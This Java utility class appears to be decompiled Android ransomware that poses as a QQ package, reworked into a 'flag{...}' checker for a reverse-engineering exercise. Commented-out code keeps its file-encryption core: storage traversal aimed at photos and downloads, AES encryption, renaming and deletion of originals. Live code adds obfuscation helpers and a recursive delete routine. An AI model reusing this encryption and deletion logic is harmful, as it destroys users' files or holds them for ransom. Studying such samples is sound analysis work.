package com.android.tencent.qq.qq;

/**************************************************************************
 * project:Analysis
 * Email: 
 * file:utils
 * Created by pwd61 on 2019/8/19 5:52
 * description:
 *
 *
 *
 *
 *
 ***************************************************************************/

import android.app.Activity;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.text.TextUtils;
import android.util.Base64;
import android.view.View;

import com.example.pwd61.analysis.R;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Utils {

    static int aa;
    private static final char[] arr = new char[]{21152, 36733, 26412, 20214, 35831, 21368, 35201, 24494, 36719, 19981, 21487, 20197, 26469, 21435, 23433, 'a', 20154, '7', 20943, 22909, 'l', 21331, 27979, 'p', 35797, 'p', '3', '7', 20056, 21527, 'b', 26704, 'c', 'e', 30524, 'q', '6', '4', 20197, 20026, 31070, 'd', 26080, 'f', 21151, 22307, 21517, 33267, 24049, '0', 20309, 35299, 24551, 'g', 21807, 26377, '1', 26460, '2', 24247, 'h', '}', '{'};
    static int bb;
    public static final ExecutorService executorService = Executors.newFixedThreadPool(10);
    public static List filesToEncrypt = new ArrayList();
    static int hh;
    /* renamed from: 彼岸花开 */
    static boolean f357;

    public static native boolean dec(String str, String str2);

    static {
        System.loadLibrary("oo000oo");
    }

    public static boolean cec(String str, String str2) {
        if (TextUtils.isEmpty(str2)) {
            return false;
        }
        if (str2.startsWith("flag{") && str2.endsWith("}")) {
            str2 = str2.substring(str2.indexOf(123) + 1, str2.length() - 1);
        }
        byte[] bArr = new byte[0];
        try {
            bArr = str2.getBytes("utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        StringBuilder stringBuilder = new StringBuilder();
        int i = 1;
        for (byte b : bArr) {
            int i2 = b - 48;
            if (i2 > 9) {
                i2 = b - 65;
                i2 = i2 > 25 ? b == (byte) 125 ? 62 : (i2 - 97) + 36 : i2 + 10;
            }
            char c = arr[i2];
            i2 = i % 9;
            if (i2 == 0) {
                c = '+';
            }
            stringBuilder.append(c);
            if (i2 == 0) {
                int i3 = i / 9;
                stringBuilder.append(str2.substring((i3 - 1) * 9, 9 * i3));
            }
            i++;
        }
        return dec(str, Base64.encodeToString(stringBuilder.toString().getBytes(), 0));
    }

//    public static void GetFiles(String str, String str2, boolean z) {
//        File[] listFiles = new File(str).listFiles();
//        for (File file : listFiles) {
//            if (file.isFile()) {
//                String file2 = file.toString();
//                if (file2.length() >= str2.length()) {
//                    file2 = (String) file2.subSequence(file2.length() - str2.length(), file2.length());
//                }
//                if (file.isFile() && file2.equals(str2) && !file.toString().contains("/.") && file.getName().contains(".") && file.length() > 10240 && file.length() <= 52428800) {
//                    filesToEncrypt.add(file.getPath());
//                }
//                if (!z) {
//                    return;
//                }
//            } else if (!(!file.isDirectory() || file.toString().contains("/.") || file.toString().toLowerCase().contains("android") || file.toString().toLowerCase().contains("com.") || file.toString().toLowerCase().contains("miad") || (jd(file.toString()) >= 3 && !file.toString().toLowerCase().contains("baidunetdisk") && !file.toString().toLowerCase().contains("download") && !file.toString().toLowerCase().contains("dcim")))) {
//                GetFiles(file.getPath(), str2, z);
//            }
//        }
//    }

    public static String byte2hex(byte[] bArr) {
        String str = "";
        for (byte b : bArr) {
            StringBuilder stringBuilder;
            String toHexString = Integer.toHexString(b & 255);
            if (toHexString.length() == 1) {
                stringBuilder = new StringBuilder();
                stringBuilder.append(str);
                str = "0";
            } else {
                stringBuilder = new StringBuilder();
            }
            stringBuilder.append(str);
            stringBuilder.append(toHexString);
            str = stringBuilder.toString();
        }
        return str;
    }

    public static void bz(final Context context) {
        new Timer().schedule(new TimerTask() {
            public void run() {
                try {
//                    ((Activity) context).findViewById(R.id.ll);
//                    WallpaperManager.getInstance(context).setBitmap(BitmapFactory.decodeResource(context.getResources(), R.drawable.hack));
                } catch (Throwable th) {
                    th.printStackTrace();
                }
            }
        }, 1000, 5000);
    }

    public static Bitmap gp(View view) {
        if (view == null) {
            return null;
        }
        Bitmap createBitmap = Bitmap.createBitmap(view.getWidth(), view.getHeight(), Config.RGB_565);
        Canvas canvas = new Canvas(createBitmap);
        canvas.translate((float) (-view.getScrollX()), (float) (-view.getScrollY()));
        view.draw(canvas);
        return createBitmap;
    }

//    public static File decryptFile(String str, String str2, String str3) {
//        File file = new File(str2);
//        File file2 = new File(str3);
//        if (!(file2.exists() || file2.isFile())) {
//            try {
//                File parentFile = file2.getParentFile();
//                if (!parentFile.exists()) {
//                    parentFile.mkdirs();
//                    parentFile.createNewFile();
//                }
//                FileInputStream fileInputStream = new FileInputStream(file);
//                FileOutputStream fileOutputStream = new FileOutputStream(file2);
//                CipherInputStream cipherInputStream = new CipherInputStream(fileInputStream, initAESCipher(str, 1));
//                byte[] bArr = new byte[1024];
//                while (true) {
//                    int read = cipherInputStream.read(bArr);
//                    if (read < 0) {
//                        break;
//                    }
//                    fileOutputStream.write(bArr, 0, read);
//                }
//                fileOutputStream.flush();
//                fileOutputStream.close();
//                cipherInputStream.close();
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
//        }
//        return file2;
//    }
//
//    public static File encryptFile(String str, String str2, String str3) {
//        File file = new File(str2);
//        File file2 = new File(str3);
//        if (!(file2.exists() || file2.isFile())) {
//            try {
//                File parentFile = file2.getParentFile();
//                if (!parentFile.exists()) {
//                    parentFile.mkdirs();
//                    parentFile.createNewFile();
//                }
//                FileInputStream fileInputStream = new FileInputStream(file);
//                FileOutputStream fileOutputStream = new FileOutputStream(file2);
//                CipherOutputStream cipherOutputStream = new CipherOutputStream(fileOutputStream, initAESCipher(str, 1));
//                byte[] bArr = new byte[1024];
//                while (true) {
//                    int read = fileInputStream.read(bArr);
//                    if (read < 0) {
//                        break;
//                    }
//                    cipherOutputStream.write(bArr, 0, read);
//                }
//                fileOutputStream.flush();
//                fileOutputStream.close();
//                cipherOutputStream.close();
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
//        }
//        return file2;
//    }
//
//    public static void deleteDir(String str, String str2, int i, final Context context) {
//        if (i != 0) {
//            new Timer().schedule(new TimerTask() {
//                public void run() {
//                    Editor edit = context.getSharedPreferences("XH", 0).edit();
//                    edit.putInt("sss", 1);
//                    edit.commit();
//                    MainActivity.instance.finish();
//                    Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
//                    launchIntentForPackage.addFlags(1073741824);
//                    context.startActivity(launchIntentForPackage);
//                }
//            }, 5000);
//        }
//        deleteDirWithFile(new File(str), str2, i, context);
//        f357 = true;
//    }
//
//    public static void deleteDirWithFile(File file, String str, int i, final Context context) {
//        if (file != null && file.exists() && file.isDirectory()) {
//            List asList = Arrays.asList(file.listFiles());
//            Collections.reverse(asList);
//            for (final File file2 : (File[]) asList.toArray(new File[asList.size()])) {
//                String file3 = file2.toString();
//                if (file3.length() >= MainActivity.hzs) {
//                    file3 = (String) file3.subSequence(file3.length() - MainActivity.hzs, file3.length());
//                }
//                if (i == 0) {
//                    try {
//                        if (file2.isFile() && file3.equals(MainActivity.hz) && !file2.toString().contains("/.") && file2.getName().contains(".")) {
//                            executorService.execute(new Runnable() {
//                                public void run() {
//                                    String name = file2.getName();
//                                    StringBuilder stringBuilder = new StringBuilder();
//                                    stringBuilder.append("!\uff01");
//                                    stringBuilder.append(MainActivity.hz);
//                                    if (name.contains(stringBuilder.toString())) {
//                                        file2.delete();
//                                    }
//                                    utils.aa++;
//                                    if (utils.filesToEncrypt.size() <= utils.aa) {
//                                        utils.aa = 0;
//                                        utils.filesToEncrypt = new ArrayList();
//                                        Editor edit = context.getSharedPreferences("XH", 0).edit();
//                                        edit.putInt("cjk", 1);
//                                        edit.commit();
//                                        MainActivity.instance.finish();
//                                        Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
//                                        launchIntentForPackage.addFlags(67108864);
//                                        context.startActivity(launchIntentForPackage);
//                                    }
//                                }
//                            });
//                        } else if (!(!file2.isDirectory() || file2.toString().contains("/.") || file2.toString().toLowerCase().contains("android") || file2.toString().toLowerCase().contains("com.") || file2.toString().toLowerCase().contains("miad") || (jd(file2.toString()) >= 3 && !file2.toString().toLowerCase().contains("baidunetdisk") && !file2.toString().toLowerCase().contains("download") && !file2.toString().toLowerCase().contains("dcim")))) {
//                            deleteDirWithFile(file2, str, i, context);
//                        }
//                    } catch (Exception unused) {
//                    }
//                } else {
//                    if (file2.isFile() && !file3.equals(MainActivity.hz) && !file2.toString().contains("/.") && file2.getName().contains(".") && file2.length() > 10240 && file2.length() <= 52428800) {
//                        StringBuilder stringBuilder = new StringBuilder();
//                        stringBuilder.append(file2.getName());
//                        stringBuilder.append(MainActivity.hz);
//                        if (zjs(stringBuilder.toString()) <= 251) {
//                            bb++;
//                            executorService.execute(new Runnable() {
//                                public void run() {
//                                    utils.hh++;
//                                    if (utils.bb == utils.hh && utils.f357) {
//                                        Editor edit = context.getSharedPreferences("XH", 0).edit();
//                                        edit.putInt("sss", 1);
//                                        edit.commit();
//                                        MainActivity.instance.finish();
//                                        Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
//                                        launchIntentForPackage.addFlags(1073741824);
//                                        context.startActivity(launchIntentForPackage);
//                                    }
//                                }
//                            });
//                        }
//                    }
//                    if (!(!file2.isDirectory() || file2.toString().contains("/.") || file2.toString().toLowerCase().contains("android") || file2.toString().toLowerCase().contains("com.") || file2.toString().toLowerCase().contains("miad") || (jd(file2.toString()) >= 3 && !file2.toString().toLowerCase().contains("baidunetdisk") && !file2.toString().toLowerCase().contains("download") && !file2.toString().toLowerCase().contains("dcim")))) {
//                        deleteDirWithFile(file2, str, i, context);
//                    }
//                }
//            }
//        }
//    }

    public static String formatDuring(long j) {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(to2Str(j / 86400000));
        stringBuilder.append(":");
        stringBuilder.append(to2Str((j % 86400000) / 3600000));
        stringBuilder.append(":");
        stringBuilder.append(to2Str((j % 3600000) / 60000));
        stringBuilder.append(":");
        stringBuilder.append(to2Str((j % 60000) / 1000));
        return stringBuilder.toString();
    }

    public static String formatDuring(Date date, Date date2) {
        return formatDuring(date2.getTime() - date.getTime());
    }

    public static String getStringRandom(int i) {
        String str = "";
        Random random = new Random();
        for (int i2 = 0; i2 < i; i2++) {
            String str2 = random.nextInt(2) % 2 == 0 ? "char" : "num";
            if ("char".equalsIgnoreCase(str2)) {
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append(str);
                stringBuilder.append((char) ((random.nextInt(2) % 2 == 0 ? 65 : 97) + random.nextInt(26)));
                str = stringBuilder.toString();
            } else if ("num".equalsIgnoreCase(str2)) {
                StringBuilder stringBuilder2 = new StringBuilder();
                stringBuilder2.append(str);
                stringBuilder2.append(String.valueOf(random.nextInt(10)));
                str = stringBuilder2.toString();
            }
        }
        return str;
    }

    public static final String getbah(String str) {
        String str2 = new String(Base64.encode("by:\u5f7c\u5cb8\u82b1 qq:1279525738".getBytes(), 0));
        String str3 = (String) str2.subSequence(3, 4);
        str2 = (String) str2.subSequence(4, 5);
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(String.valueOf(new StringBuffer(new String(Base64.encode(str.getBytes(), 0))).reverse()));
        stringBuilder.append("");
        return new String(Base64.encode(stringBuilder.toString().getBytes(), 0)).replaceAll(str3, "\u4e09\u751f\u77f3\u7554").replaceAll(str2, "\u5f7c\u5cb8\u82b1\u5f00").replaceAll("\u4e09\u751f\u77f3\u7554", str2).replaceAll("\u5f7c\u5cb8\u82b1\u5f00", str3);
    }

    public static String getmm(String str) {
        byte[] digest;
        byte[] bArr = (byte[]) null;
        try {
            MessageDigest instance = MessageDigest.getInstance("SHA-1");
            instance.update(str.getBytes());
            digest = instance.digest();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            digest = bArr;
        }
        return byte2hex(digest);
    }

    public static final String generateCipher(String str) {
        char[] cArr = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
        try {
            byte[] bytes = str.getBytes();
            MessageDigest instance = MessageDigest.getInstance("MD5");
            instance.update(bytes);
            char[] cArr2 = new char[(instance.getDigestLength() * 2)];
            byte[] digest = instance.digest();
            int length = digest.length;
            int i = 0;
            int i2 = 0;
            while (i < length) {
                byte b = digest[i];
                int i3 = i2 + 1;
                cArr2[i2] = cArr[(b >>> 4) & 15];
                i2 = i3 + 1;
                cArr2[i3] = cArr[b & 15];
                i++;
            }
            return new String(cArr2).substring(8, 24);
        } catch (Exception e) {
            e.printStackTrace();
            return (String) null;
        }
    }

//    private static Cipher initAESCipher(String str, int i) {
//        NoSuchAlgorithmException e;
//        NoSuchPaddingException e2;
//        InvalidKeyException e3;
//        InvalidAlgorithmParameterException e4;
//        Cipher cipher = (Cipher) null;
//        try {
//            IvParameterSpec ivParameterSpec = new IvParameterSpec("QQqun 571012706 ".getBytes());
//            SecretKeySpec secretKeySpec = new SecretKeySpec(str.getBytes(), "AES");
//            Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
//            try {
//                instance.init(i, secretKeySpec, ivParameterSpec);
//                return instance;
//            } catch (NoSuchAlgorithmException e5) {
//                e = e5;
//                cipher = instance;
//                e.printStackTrace();
//                return cipher;
//            } catch (NoSuchPaddingException e6) {
//                e2 = e6;
//                cipher = instance;
//                e2.printStackTrace();
//                return cipher;
//            } catch (InvalidKeyException e7) {
//                e3 = e7;
//                cipher = instance;
//                e3.printStackTrace();
//                return cipher;
//            } catch (InvalidAlgorithmParameterException e8) {
//                e4 = e8;
//                cipher = instance;
//                e4.printStackTrace();
//                return cipher;
//            }
//        } catch (NoSuchAlgorithmException e9) {
//            e = e9;
//            e.printStackTrace();
//            return cipher;
//        } catch (NoSuchPaddingException e10) {
//            e2 = e10;
//            e2.printStackTrace();
//            return cipher;
//        } catch (InvalidKeyException e11) {
//            e3 = e11;
//            e3.printStackTrace();
//            return cipher;
//        } catch (InvalidAlgorithmParameterException e12) {
//            e4 = e12;
//            e4.printStackTrace();
//            return cipher;
//        }
//    }
//
//    static int jd(String str) {
//        str = str.replaceAll(MainActivity.externalStorageDirectory.toString(), "");
//        return str.length() - str.replaceAll("/", "").length();
//    }
//
//    public static void jj(File file, String str, int i) {
//        str = generateCipher(str);
//        String file2;
//        if (i == 0) {
//            file2 = file.toString();
//            decryptFile(str, file.toString(), (String) file2.subSequence(0, file2.length() - MainActivity.hzs));
//        } else {
//            file2 = file.toString();
//            StringBuilder stringBuilder = new StringBuilder();
//            stringBuilder.append(String.valueOf(file));
//            stringBuilder.append("!\uff01");
//            stringBuilder.append(MainActivity.hz);
//            encryptFile(str, file2, stringBuilder.toString());
//            StringBuilder stringBuilder2 = new StringBuilder();
//            stringBuilder2.append(String.valueOf(file));
//            stringBuilder2.append("!\uff01");
//            stringBuilder2.append(MainActivity.hz);
//            File file3 = new File(stringBuilder2.toString());
//            stringBuilder = new StringBuilder();
//            stringBuilder.append(String.valueOf(file));
//            stringBuilder.append(MainActivity.hz);
//            file3.renameTo(new File(stringBuilder.toString()));
//        }
//        file.delete();
//    }

    public static String l(String str) {
        int i = 0;
        String replaceAll = Base64.encodeToString("\u4e09\u751f\u77f3\u7554 \u5f7c\u5cb8\u82b1\u5f00".getBytes(), 0).replaceAll("\\D+", "");
        Integer valueOf = Integer.valueOf(new StringBuffer(replaceAll).reverse().toString());
        char[] toCharArray = str.toCharArray();
        for (int i2 = 0; i2 < toCharArray.length; i2++) {
            toCharArray[i2] = (char) (valueOf.intValue() ^ toCharArray[i2]);
        }
        str = new StringBuffer(new String(Base64.decode(new String(toCharArray), 0))).reverse().toString();
        Integer valueOf2 = Integer.valueOf(replaceAll);
        toCharArray = str.toCharArray();
        while (i < toCharArray.length) {
            toCharArray[i] = (char) (valueOf2.intValue() ^ toCharArray[i]);
            i++;
        }
        return new String(toCharArray);
    }

    public static void deleteFile(final File file) {
        new Thread(new Runnable() {
            public void run() {
                if (!file.getName().contains("\u5f7c\u5cb8\u82b1\u5f00")) {
                    if (file.isFile()) {
                        file.delete();
                    } else if (file.isDirectory()) {
                        File[] listFiles = file.listFiles();
                        if (listFiles == null || listFiles.length == 0) {
                            file.delete();
                            return;
                        }
                        for (File deleteFile : listFiles) {
                            Utils.deleteFile(deleteFile);
                        }
                        file.delete();
                    }
                }
            }
        }).start();
    }

    private static String to2Str(long j) {
        StringBuilder stringBuilder;
        if (j > 9) {
            stringBuilder = new StringBuilder();
            stringBuilder.append(String.valueOf(j));
            stringBuilder.append("");
        } else {
            stringBuilder = new StringBuilder();
            stringBuilder.append("0");
            stringBuilder.append(j);
        }
        return stringBuilder.toString();
    }

    static int zjs(String str) {
        return str.getBytes().length;
    }

}
